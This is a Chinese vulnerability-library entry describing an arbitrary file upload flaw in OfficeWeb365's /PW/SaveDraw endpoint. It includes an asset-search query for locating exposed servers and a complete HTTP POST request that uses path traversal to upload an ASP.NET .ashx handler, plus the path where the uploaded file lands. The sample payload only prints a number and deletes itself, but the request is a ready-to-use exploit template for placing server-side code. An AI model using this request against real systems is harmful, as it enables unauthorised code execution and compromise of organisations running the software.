---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# OfficeWeb365 SaveDraw存在任意文件上传漏洞

# 一、漏洞简介
OfficeWeb365是西安大西信息科技有限公司开发的，专注于Office文档在线预览及PDF文档在线预览云服务，包括Microsoft Word文档在线预览、Excel表格在线预览、Powerpoint演示文档在线预览，WPS文字处理、WPS表格、WPS演示及Adobe PDF文档在线预览。广泛应用于OA办公系统、招聘网站、在线教育类网站，提高客户体验、增加产品竞争力。OfficeWeb365 /PW/SaveDraw存在任意文件上传漏洞。

# 二、影响版本
+ OfficeWeb365

# 三、资产测绘
+ hunter：`app.name="OfficeWeb365"`


+ 登录页面


# 四、漏洞复现
```plain
POST /PW/SaveDraw?path=../../Content/img&idx=11.ashx HTTP/1.1
Host: xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Content-Type: application/x-www-form-urlencoded

data:image/png;base64,<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
{
public void ProcessRequest(System.Web.HttpContext context)
{
System.Web.HttpResponse response = context.Response;
response.Write(44 * 41);

string filePath = context.Server.MapPath("/") + context.Request.Path;
if (System.IO.File.Exists(filePath))
{
    System.IO.File.Delete(filePath);
}
}
public bool IsReusable
{
get { return false; }
}
}///---
```


上传文件位置

```plain
/Content/img/UserDraw/drawPW11.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ws6vxp637qoycw2u>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
